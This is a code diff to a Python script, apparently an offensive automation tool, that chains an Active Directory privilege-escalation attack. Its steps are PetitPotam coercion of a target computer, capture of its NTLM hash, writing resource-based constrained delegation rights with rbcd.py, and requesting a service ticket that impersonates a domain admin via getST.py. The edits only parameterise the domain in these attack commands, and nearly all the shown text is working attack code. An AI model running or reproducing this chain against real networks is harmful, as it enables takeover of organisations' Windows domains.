@@ -93,7 +93,7 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     # Step 4: Coerce Target Computer With PetitPotam
     print("[*] Coercing target computer with PetitPotam...")
     home_dir = os.path.expanduser("~")
-    run_command(f"python3 {home_dir}/PetitPotam/PetitPotam.py -u {username} -p '{password}' {your_ip} {target_ip}")
+    run_command(f"python3 {home_dir}/PetitPotam/PetitPotam.py -u {username}@{domain} -p '{password}' {your_ip} {target_ip}")
     print("[*] Target coercion complete.")
 
     # Step 5: Get NTLM Hash of Target Machine
@@ -114,11 +114,11 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
 
     # Step 6: Modify msDS-AllowedToActOnBehalfOfOtherIdentity Attribute
     print("[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity attribute...")
-    run_command(f"python3 /usr/local/bin/rbcd.py -action write -delegate-to {target_machine} -delegate-from {machine_acc}$ domain.local/{target_machine} -hashes ':{ntlm_hash}'")
+    run_command(f"python3 /usr/local/bin/rbcd.py -action write -delegate-to {target_machine} -delegate-from {machine_acc}$ {domain}/{target_machine} -hashes ':{ntlm_hash}'")
 
     # Step 7: Obtain Service Ticket (ST)
     print("[*] Obtaining Service Ticket (ST)...")
-    st_output = run_command(f"python3 /usr/local/bin/getST.py -spn cifs/{target_machine} 'domain/{machine_acc}$' -impersonate {domain_admin} -dc-ip {dc_ip}")
+    st_output = run_command(f"python3 /usr/local/bin/getST.py -spn cifs/{target_machine} '{domain}/{machine_acc}$' -impersonate {domain_admin} -dc-ip {dc_ip}")
 
     # Extract the ccache file name from the output
     ccache_file = None
